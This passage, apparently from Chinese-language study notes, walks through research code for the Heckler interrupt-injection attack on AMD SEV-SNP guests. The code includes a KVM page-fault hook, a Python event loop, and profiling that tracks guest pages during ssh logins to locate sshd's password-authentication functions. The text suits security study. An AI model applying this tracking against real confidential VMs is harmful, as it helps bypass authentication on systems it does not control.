<p>SNP-guest可以自己设置一个feature bit来达到restricted injection只允许一个新的中断#HV</p>
<p>然后guest内的#HV handler处理中断</p>
<p>但是只转发不过滤还是没用的 还是可能转发一个inx 0x80做syscall</p>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>python模块和kvm的通信也是通过sev step</p>
<p>kvm:</p>
<p>kvm_tdp_mmu_page_fault-&gt;page_fault_handle_page_track-&gt;heckler_on_page_fault</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">heckler_on_page_fault</span><span class="params">(<span class="keyword">struct</span> kvm_vcpu *vcpu, <span class="keyword">struct</span> kvm_page_fault *fault)</span> &#123;</span><br><span class="line">    <span class="type">int</span> active = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kvm_memory_slot</span> *<span class="title">slot</span>;</span></span><br><span class="line">    <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    slot = kvm_vcpu_gfn_to_memslot(vcpu, fault-&gt;gfn);</span><br><span class="line">    <span class="keyword">if</span> (slot != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        active = kvm_slot_page_track_is_active(vcpu-&gt;kvm,</span><br><span class="line">                                               slot,</span><br><span class="line">                                               fault-&gt;gfn,</span><br><span class="line">                                               KVM_PAGE_TRACK_EXEC);</span><br><span class="line">        <span class="keyword">if</span> (active) &#123;</span><br><span class="line">            __do_untrack_single_page(vcpu,</span><br><span class="line">                                     fault-&gt;gfn);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">            kvm_vcpu_exec_unprotect_gfn(vcpu,</span><br><span class="line">                                        fault-&gt;gfn,</span><br><span class="line">                                        <span class="literal">true</span>);</span><br><span class="line">            __clear_nx_on_page(vcpu,</span><br><span class="line">                               fault-&gt;gfn);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pr_info(<span class="string">&quot;c:%d active: %d pf: %llx x:%d p:%d w:%d u:%d &quot;</span></span><br><span class="line">            <span class="string">&quot;rsvd %d pref:%d tdp:%d\n&quot;</span>,</span><br><span class="line">            uspt_ctx != <span class="literal">NULL</span>, active, fault-&gt;addr, fault-&gt;exec,</span><br><span class="line">            fault-&gt;present, fault-&gt;write, fault-&gt;user, fault-&gt;rsvd,</span><br><span class="line">            fault-&gt;prefetch, fault-&gt;is_tdp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (uspt_ctx == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (active) &#123;</span><br><span class="line">        <span class="type">usp_page_fault_event_t</span> pf_event = &#123;</span><br><span class="line">            .faulted_gpa = (<span class="type">uint64_t</span>)(fault-&gt;addr),</span><br><span class="line">            .is_decrypted_vmsa_data_valid = <span class="literal">false</span>,</span><br><span class="line">            .has_vmsa_blob = <span class="number">0</span>,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ret = usp_send_and_block(uspt_ctx,</span><br><span class="line">                                 PAGE_FAULT_EVENT,</span><br><span class="line">                                 (<span class="type">void</span> *)&amp;pf_event);</span><br><span class="line">        <span class="keyword">switch</span> (ret) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>: &#123;</span><br><span class="line">                pr_info(<span class="string">&quot;usp_send_and_block aborted due to force_reset\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="comment">//no error</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>: &#123;</span><br><span class="line">                pr_info(<span class="string">&quot;usp_send_and_block: Failed in svm_vcpu_run with %d&quot;</span>, ret);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> PyObject* <span class="title function_">heckler_block_until_event</span><span class="params">(PyObject* self, PyObject* args)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> gpa;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (event_buffer != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;memory leak? freeing event_buffer\n&quot;</span>);</span><br><span class="line">		free_usp_event(event_type, event_buffer);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Do not block the GIL on block until event</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	Py_BEGIN_ALLOW_THREADS</span><br><span class="line">		ret = usp_block_until_event(&amp;ctx, &amp;event_type, &amp;event_buffer);</span><br><span class="line">	Py_END_ALLOW_THREADS</span><br><span class="line">	<span class="title function_">if</span> <span class="params">(ret == SEV_STEP_ERR_ABORT)</span></span><br><span class="line">	&#123;</span><br><span class="line">		ret = SEV_STEP_ERR_ABORT;</span><br><span class="line">		<span class="keyword">goto</span> end;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (ret == SEV_STEP_ERR)</span><br><span class="line">		<span class="keyword">if</span> (event_type != PAGE_FAULT_EVENT)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%s:%d : expected page fault event, got %d\n&quot;</span>, __FILE__, __LINE__, event_type);</span><br><span class="line">			ret = EXIT_CODE_ERR;</span><br><span class="line">			__clean_up();</span><br><span class="line">			<span class="keyword">goto</span> end;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="type">usp_page_fault_event_t</span>* pf_event = (<span class="type">usp_page_fault_event_t</span>*)event_buffer;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (debug)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(BHGRN <span class="string">&quot;Pagefault Event: &#123;GPA:0x%lx&#125;\n&quot;</span>reset, pf_event-&gt;faulted_gpa);</span><br><span class="line">	&#125;</span><br><span class="line">	gpa = pf_event-&gt;faulted_gpa;</span><br><span class="line">end:</span><br><span class="line">	<span class="keyword">if</span> (ret != <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		gpa = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> Py_BuildValue(<span class="string">&quot;&#123;s:i,s:K&#125;&quot;</span>,</span><br><span class="line">		<span class="string">&quot;ret&quot;</span>, ret, <span class="string">&quot;gpa&quot;</span>, gpa);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_track_once</span>(<span class="params">self, boot,</span></span><br><span class="line"><span class="params">                    gpa_to_track=<span class="literal">None</span>,</span></span><br><span class="line"><span class="params">                    timeout_s=<span class="literal">None</span>,</span></span><br><span class="line"><span class="params">                    event_timeout=<span class="literal">False</span>,</span></span><br><span class="line"><span class="params">                    wait_before_go=<span class="literal">False</span></span>):</span><br><span class="line">        self.do_page_tracking_ready = <span class="literal">False</span></span><br><span class="line">        self.do_page_tracking_stopped = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> wait_before_go:</span><br><span class="line">            self.do_page_tracking = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.do_page_tracking = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        run_list = []</span><br><span class="line">        run_set = OrderedSet()</span><br><span class="line">        pfs = &#123;&#125;</span><br><span class="line">        last_gpa = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">th_timeout</span>():</span><br><span class="line">            time.sleep(timeout_s)</span><br><span class="line">            self.do_page_tracking = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        th = threading.Thread(target=th_timeout, args=[], daemon=<span class="literal">True</span>)</span><br><span class="line">        h.heckler_init()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> timeout_s <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            th.start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> boot:</span><br><span class="line">            h.heckler_enable_boot_tracking()</span><br><span class="line">            <span class="keyword">assert</span> gpa_to_track <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="built_in">len</span>(gpa_to_track) == <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            h.heckler_enable_tracking()</span><br><span class="line">            h.heckler_untrack_all_pages()</span><br><span class="line">            <span class="keyword">if</span> gpa_to_track <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="built_in">len</span>(gpa_to_track) == <span class="number">0</span>:</span><br><span class="line">                h.heckler_track_all_pages()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">for</span> gpa <span class="keyword">in</span> gpa_to_track:</span><br><span class="line">                    h.heckler_track_page(gpa)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;marking <span class="subst">&#123;<span class="built_in">len</span>(gpa_to_track)&#125;</span> pages&quot;</span>)</span><br><span class="line"></span><br><span class="line">        acked = <span class="literal">True</span></span><br><span class="line">        errors = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        self.do_page_tracking_ready = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> wait_before_go:</span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> self.do_page_tracking:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> self.do_page_tracking:</span><br><span class="line">                acked = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">if</span> event_timeout:</span><br><span class="line">                    ev = h.heckler_block_until_event_timeout(<span class="number">5</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    ev = h.heckler_block_until_event()</span><br><span class="line">                <span class="keyword">if</span> ev <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> ev.get(<span class="string">&#x27;ret&#x27;</span>) == <span class="number">1</span> <span class="keyword">or</span> ev.get(<span class="string">&#x27;gpa&#x27;</span>) == <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">if</span> ev <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                        <span class="keyword">if</span> ev.get(<span class="string">&#x27;ret&#x27;</span>) == h.HECKLER_ERR_ABORT:</span><br><span class="line">                            <span class="keyword">continue</span></span><br><span class="line">                    errors = errors + <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> errors &gt; <span class="number">300</span>:</span><br><span class="line">                        <span class="built_in">print</span>(ev)</span><br><span class="line">                        <span class="built_in">print</span>(errors)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        h.heckler_ack_event()</span><br><span class="line">                        acked = <span class="literal">True</span></span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                gpa = <span class="built_in">int</span>(ev.get(<span class="string">&#x27;gpa&#x27;</span>))</span><br><span class="line">                <span class="keyword">if</span> gpa <span class="keyword">not</span> <span class="keyword">in</span> pfs:</span><br><span class="line">                    pfs[gpa] = <span class="number">0</span></span><br><span class="line">                pfs[gpa] += <span class="number">1</span></span><br><span class="line">                run_list.append(gpa)</span><br><span class="line">                run_set.add(gpa)</span><br><span class="line">                last_gpa = gpa</span><br><span class="line"></span><br><span class="line">                h.heckler_ack_event()</span><br><span class="line">                acked = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> acked:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                h.heckler_ack_event()</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">        self.do_page_tracking_stopped = <span class="literal">True</span></span><br><span class="line">        h.heckler_untrack_all_pages()</span><br><span class="line">        h.heckler_clean_up()</span><br><span class="line"></span><br><span class="line">        pf_analysis = &#123;</span><br><span class="line">            <span class="string">&#x27;run_list&#x27;</span>: run_list,</span><br><span class="line">            <span class="string">&#x27;run_set&#x27;</span>: run_set,</span><br><span class="line">            <span class="string">&#x27;pfs&#x27;</span>: pfs,</span><br><span class="line">        &#125;</span><br><span class="line">        self.do_page_tracking = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> pf_analysis</span><br></pre></td></tr></table></figure>









<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_do_profile</span>(<span class="params">self,</span></span><br><span class="line"><span class="params">                do_trace,</span></span><br><span class="line"><span class="params">                include_set=<span class="literal">None</span>,</span></span><br><span class="line"><span class="params">                max_hit=<span class="literal">None</span></span>):</span><br><span class="line">    self._kill_utility()</span><br><span class="line">    ssh_conn = SshConnection()</span><br><span class="line">    ssh_conn.prepare()</span><br><span class="line">    ssh_conn.establish_connection_pw_wrong_once()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_handshake</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">nonlocal</span> ssh_conn</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.do_page_tracking_ready:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Doing ssh login...&quot;</span>)</span><br><span class="line">        self.do_page_tracking = <span class="literal">True</span></span><br><span class="line">        ssh_conn.enter_password()</span><br><span class="line">        self.do_page_tracking = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    th_ssh_conn = threading.Thread(target=do_handshake,</span><br><span class="line">                                   args=[self],</span><br><span class="line">                                   daemon=<span class="literal">False</span>)</span><br><span class="line">    th_ssh_conn.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> do_trace:</span><br><span class="line">        res = self._track_trace(include_set,</span><br><span class="line">                                max_hit=max_hit,</span><br><span class="line">                                wait_before_go=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = self._track_once(boot=<span class="literal">False</span>,</span><br><span class="line">                               gpa_to_track=include_set,</span><br><span class="line">                               event_timeout=<span class="literal">False</span>,</span><br><span class="line">                               wait_before_go=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Waiting for tracking thread to join() (hit ctrl-c to quit)&quot;</span>)</span><br><span class="line">    th_ssh_conn.join()</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_do_trace</span>(<span class="params">self,</span></span><br><span class="line"><span class="params">              include_set,</span></span><br><span class="line"><span class="params">              max_hit=<span class="number">30</span></span>):</span><br><span class="line">    trace_results = self._do_profile(<span class="literal">True</span>, include_set=include_set, max_hit=max_hit)</span><br><span class="line">    self._kill_utility()</span><br><span class="line"></span><br><span class="line">    run_list = trace_results[<span class="string">&#x27;run_list&#x27;</span>]</span><br><span class="line">    run_set = trace_results[<span class="string">&#x27;run_set&#x27;</span>]</span><br><span class="line">    self._dump(<span class="string">&#x27;trace_results&#x27;</span>, trace_results)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> run_list, run_set</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>(<span class="params">self, include_set=<span class="literal">None</span></span>):</span><br><span class="line">    track_once_results = self._do_profile(<span class="literal">False</span>, include_set=include_set)</span><br><span class="line">    run_set = track_once_results[<span class="string">&#x27;run_set&#x27;</span>]</span><br><span class="line">    self._dump(<span class="string">&#x27;track_once_results&#x27;</span>, track_once_results)</span><br><span class="line">    <span class="keyword">return</span> run_set</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trace</span>(<span class="params">self, total_include_set, index=<span class="number">0</span></span>):</span><br><span class="line">    trace_list, run_set = self._do_trace(total_include_set)</span><br><span class="line">    self._santiy_check(trace_list, <span class="string">&quot;application trace&quot;</span>)</span><br><span class="line"></span><br><span class="line">    self._dump(<span class="string">f&quot;trace_list_<span class="subst">&#123;index&#125;</span>&quot;</span>, trace_list, force=<span class="literal">False</span>)</span><br><span class="line">    self._dump(<span class="string">&quot;run_set_latest&quot;</span>, trace_list, force=<span class="literal">False</span>, time_suffix=<span class="literal">False</span>)</span><br><span class="line">    self._dump(<span class="string">&quot;ground_truth&quot;</span>,</span><br><span class="line">               &#123;<span class="string">&#x27;mm_answer_authpassword&#x27;</span>: self.page_sshd_mm_answer_authpassword,</span><br><span class="line">                <span class="string">&#x27;auth_password&#x27;</span>: self.page_sshd_auth_password&#125;, force=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> trace_list, run_set</span><br></pre></td></tr></table></figure>

<h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p><strong>page set&#x2F;trace 记录的都是GPA</strong> 从page fault中拿到的GPA</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">total_include_set = OrderedSet()</span><br><span class="line">total_exclude_set = OrderedSet()</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Boot set</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">console.rule(<span class="string">&quot;Profiling Boot (S_Boot)&quot;</span>)</span><br><span class="line">boot_set = self.boot()</span><br><span class="line">total_exclude_set.update(boot_set)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Idle Execution</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">console.rule(<span class="string">f&quot;Profiling idle execution&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Profiling <span class="subst">&#123;i&#125;</span>...&quot;</span>)</span><br><span class="line">    exclude = self._track_once(boot=<span class="literal">False</span>, timeout_s=<span class="number">5</span>)</span><br><span class="line">    exclude_set = exclude[<span class="string">&#x27;run_set&#x27;</span>]</span><br><span class="line">    total_exclude_set.update(exclude_set)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Application Set</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Profiling ssh login attempt <span class="subst">&#123;i + <span class="number">1</span>&#125;</span> (S_App)&quot;</span>)</span><br><span class="line">    include_set = self.profile(total_include_set)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(total_include_set) == <span class="number">0</span>:</span><br><span class="line">    	total_include_set.update(include_set)</span><br><span class="line">    	total_include_set.difference_update(total_exclude_set)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    	total_include_set.intersection_update(include_set)</span><br><span class="line">    	total_include_set.difference_update(total_exclude_set)</span><br><span class="line"></span><br><span class="line">       </span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Application Trace</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">candidates = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">	console.rule(<span class="string">f&quot;Profiling application trace (<span class="subst">&#123;i&#125;</span>)&quot;</span></span><br><span class="line">	<span class="string">f&quot;(PT_App with |S_App|=<span class="subst">&#123;<span class="built_in">len</span>(total_include_set)&#125;</span>)&quot;</span>)</span><br><span class="line">    self._sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    run_list, run_set = self.trace(total_include_set, i)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Collected trace of <span class="subst">&#123;<span class="built_in">len</span>(run_list)&#125;</span> pages (PT_App)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    new_candidates = find_candidates(run_list,</span><br><span class="line">    run_set,</span><br><span class="line">    self.page_sshd_auth_password,</span><br><span class="line">    self.page_sshd_mm_answer_authpassword,</span><br><span class="line">    debug=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    candidates = self._filter_candidates(new_candidates,</span><br><span class="line">    candidates,</span><br><span class="line">    run_list,</span><br><span class="line">    debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>



<h3 id="构造gadget"><a href="#构造gadget" class="headerlink" title="构造gadget"></a>构造gadget</h3><p>最tricky的一步：如何在PTapp里找到Aseq？</p>
